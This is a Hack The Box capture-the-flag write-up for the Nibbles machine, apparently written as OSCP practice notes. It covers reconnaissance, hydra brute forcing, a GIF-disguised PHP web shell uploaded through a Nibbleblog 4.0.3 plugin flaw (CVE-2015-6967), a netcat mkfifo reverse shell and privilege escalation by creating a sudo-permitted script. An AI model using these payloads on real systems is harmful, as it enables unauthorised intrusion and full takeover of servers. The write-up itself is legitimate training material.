# Nibbles (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (OpenSSH 7.2p2), 80 (Apache 2.4.18 Ubuntu 16.04)
└── Burp → HTML comment: <!-- /nibbleblog/ directory. Nothing interesting here! -->

Foothold
├── /nibbleblog/ → "Powered by Nibbleblog"
├── /nibbleblog/admin/boot/rules/98-constants.bit → NIBBLEBLOG_VERSION = 4.0.3 "Coffee"
├── searchsploit nibbleblog → php/remote/38489.rb (Arbitrary File Upload)
├── /nibbleblog/update.php → ./content/private/
├── /nibbleblog/content/private/users.xml → username: admin
├── hydra → IP got blacklisted
├── new VPN IP → admin:<PASSWORD>
└── /nibbleblog/admin.php?controller=plugins&action=list → My Image plugin

Exploitation (File Upload)
├── cmd.php: GIF8; <?php echo system($_REQUEST['ipp']); ?>
├── Upload via My Image → /nibbleblog/content/private/plugins/my_image/image.php
├── ?ipp=whoami → RCE (nibbler)
└── Reverse shell via POST → nc -lvnp 9001

Lateral Movement / User Flag
├── /home/nibbler/user.txt
└── Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'

Privilege Escalation
├── sudo -l → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
├── mkdir -p personal/stuff
├── echo '/bin/bash -ip' > monitor.sh && chmod +x monitor.sh
├── sudo ./monitor.sh → root
└── cat /root/root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Ubuntu 16.04 with Apache 2.4.18. The web server hosts Nibbleblog 4.0.3 "Coffee". The My Image plugin allows file uploads without extension validation.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.96.84
```

| Port | Service | Version                         |
|------|---------|---------------------------------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80   | HTTP    | Apache httpd 2.4.18 (Ubuntu)    |

Port 5904 is filtered.

### Stack Identification

A Burp response contains an HTML comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

---

## Foothold

### Detecting Nibbleblog Version

```bash
curl http://10.129.96.84/nibbleblog/admin/boot/rules/98-constants.bit
```

```php
define('NIBBLEBLOG_VERSION', '4.0.3');
define('NIBBLEBLOG_NAME',    'Coffee');
```

### Searching for Public Exploits

```bash
searchsploit nibbleblog
```

| Exploit Title                                         | Path                  |
|-------------------------------------------------------|-----------------------|
| Nibbleblog 3 - Multiple SQL Injections                | php/webapps/35865.txt |
| Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb   |

Copy for analysis:

```bash
searchsploit -m php/remote/38489.rb
```

### Key Fields in the Exploit

```ruby
'uri' => normalize_uri(target_uri.path, 'admin.php'),
'vars_get' => {
  'controller' => 'plugins',
  'action'     => 'config',
  'plugin'     => 'my_image'
}
```

**CVE-2015-6967** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-6967)

Nibbleblog 4.0.3 - My Image plugin: arbitrary file upload (no extension/MIME validation).

Vulnerability: the My Image plugin preserves the original file extension and does not validate the file type - a PHP file can be uploaded.

### Obtaining Credentials

```bash
curl http://10.129.96.84/nibbleblog/update.php
# DB updated: ./content/private/config.xml
# DB updated: ./content/private/comments.xml

curl http://10.129.96.84/nibbleblog/content/private/users.xml
```

The user `admin` is visible. First brute-force attempt via hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou-50.txt 10.129.96.84 \
  http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -t 64
```

After 5 failed attempts, the IP was blacklisted (see `users.xml`). Solution - change the VPN profile, get a new IP, and guess manually:

```
admin:<PASSWORD>
```

### Uploading the Web Shell

Create a `cmd.php` file with a GIF8 header:

```
GIF8;
<?php echo system($_REQUEST['ipp']); ?>
```

Verification:

```bash
file cmd.php
# cmd.php: GIF image data 16188 x 26736
```

Upload via `/nibbleblog/admin.php?controller=plugins&action=list` → My Image.

After upload:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=whoami
# GIF8; nibbler nibbler
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Reverse Shell

```
ipp=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9001 >/tmp/f
```

In Burp Repeater - POST method, URL-encode with Ctrl+U.

```bash
nc -lvnp 9001
```

### Stabilize Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### User Flag

```bash
cat /home/nibbler/user.txt
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation

### sudo Enumeration

```bash
sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The file does not exist - create it manually:

```bash
mkdir -p personal/stuff
echo '/bin/bash -ip' > personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
sudo ./personal/stuff/monitor.sh
```

Obtain a root shell. Read the flag:

```bash
cat /root/root.txt
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value                          |
|------|--------------------------------|
| User | (see `/home/nibbler/user.txt`) |
| Root | (see `/root/root.txt`)         |

---

## Key Takeaways

- **Nibbleblog 4.0.3 My Image plugin** - file upload without extension or MIME validation; a classic path to RCE.
- **GIF8 wrapper** - bypasses the "image" check without actually rebuilding the file.
- **Nibbleblog IP blacklist** - 5 failed logins block the IP; solved by changing the VPN profile.
- **`sudo -l` on a missing script** - if root allows executing a file as root without a password and the file does not exist, it can be created manually.
